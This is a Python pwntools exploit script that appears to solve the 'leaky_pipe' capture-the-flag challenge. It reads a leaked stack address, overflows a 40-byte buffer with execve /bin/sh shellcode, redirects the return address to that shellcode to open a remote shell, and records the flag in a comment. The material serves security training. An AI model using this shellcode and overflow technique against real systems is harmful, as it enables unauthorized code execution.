# https://ctf.0xl4ugh.com/
# Import pwntools
from pwn import *

# Establish the target process
elf = ELF("leaky_pipe")
r = remote("ctf.0xl4ugh.com", 4141)
offset = 40
r.recvuntil(">.> aaaaah shiiit wtf is dat address doin here...")
leak = int(r.recvline().strip(), 16)
print(hex(leak))
# Prepare the shellcode
shellcode = asm(shellcraft.sh())
# Make the payload
payload = b""
# This shellcode is originally from: http://shell-storm.org/shellcode/files/shellcode-603.php
# This shellcode will pop a shell when we run it
payload += b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
# Padding to the return address
payload += b"A" * (40 - len(payload))
# Overwrite the return address with the address of the start of our input
payload += p64(leak)
# Send the payload, drop to an interactive shell to use the shell we pop
r.send(payload)
r.interactive()

# flag --> Oxl4ugh{waaaah_yaboooooy_kol_daaa_shellcode}